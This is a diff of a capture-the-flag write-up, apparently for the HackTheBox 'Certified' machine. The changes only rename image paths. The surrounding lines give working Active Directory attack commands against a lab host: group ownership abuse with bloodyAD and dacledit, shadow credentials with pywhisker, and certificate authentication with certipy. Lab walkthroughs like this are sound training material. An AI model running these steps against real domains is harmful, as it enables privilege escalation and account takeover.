@@ -6,7 +6,7 @@ description: 'Username: judith.mader Password: judith09'
 
 We start off by scanning for open ports:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then i looked at the different shares and downloaded everything:
 
@@ -16,7 +16,7 @@ nxc smb 10.129.231.186 -u judith.mader -p judith09 -M spider_plus -o DOWNLOAD_FL
 
 But nothing interesting so i went and looked at rpcclient and found some usernames:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 I put this in a list and launch my bloodhound collector to get e better look of the domain:
 
@@ -56,7 +56,7 @@ Since I have `WriteOwner`, I should **take ownership** first. This allows me to 
 bloodyAD --host 10.129.231.186 -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since I **own the group**, I should **grant myself more useful permissions**. `WriteMembers` lets me **add myself** to the Management group
 
@@ -64,7 +64,7 @@ Since I **own the group**, I should **grant myself more useful permissions**. `W
 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Adding a user to a high-privilege group means they inherit **new permissions**. Now that I have `WriteMembers`, I can **add myself** to a powerful group. This could give me access to **sensitive accounts or systems**.
 
@@ -72,7 +72,7 @@ Adding a user to a high-privilege group means they inherit **new permissions**. 
 bloodyAD --host 10.129.231.186 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Now that i am in the group of management\_svc, I need **persistent access** to an **elevated account**. `management_svc` might have **high privileges**, so I use **PyWhisker** to gain access **without needing a password**.
 
@@ -82,7 +82,7 @@ Now that i am in the group of management\_svc, I need **persistent access** to a
 
 {% embed url="https://github.com/ShutdownRepo/pywhisker/" %}
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add
@@ -106,7 +106,7 @@ sudo ntpdate -u 10.129.231.186
 certipy auth -pfx unprotected.pfx -dc-ip 10.129.231.186 -username 'management_svc' -domain 'certified.htb'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Just to be sure this works:
 
@@ -154,6 +154,6 @@ But when i try to auth i get an error and i have no idea why
 
 After talking for a bit witg a friend about my situation i learned that i needed to restore ca\_operator’s UPN and after doing that i was able to use administrator.pfx to request for a TGT and get a Hash:
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>
